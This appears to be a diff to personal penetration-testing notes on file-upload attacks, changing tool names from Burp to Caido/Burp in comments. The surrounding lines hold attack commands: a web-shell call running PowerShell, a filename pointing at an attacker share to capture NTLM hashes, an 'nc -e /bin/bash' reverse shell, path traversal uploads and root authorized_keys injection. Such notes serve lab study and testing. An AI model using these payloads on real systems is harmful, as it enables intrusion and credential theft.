@@ -69,7 +69,7 @@ curl http://192.168.169.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20
 - Capture NTLM hash
 
 ```shell
-# change filename with burp to access net share and get NTLM hash
+# change filename with Caido/Burp to access net share and get NTLM hash
 Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.215\\test"
 ```
 
@@ -85,7 +85,7 @@ http://.../image.php.jpg?cmd=nc -e /bin/bash <ip> <port>
 ### Non-Executable Files
 
 ```shell
-# check if a file can be uploaded using path traversal, capture the uploading with burp and
+# check if a file can be uploaded using path traversal, capture the request with Caido/Burp and
 ../../../../../../../../test.txt
 
 # inject a public key in root's authorized_keys
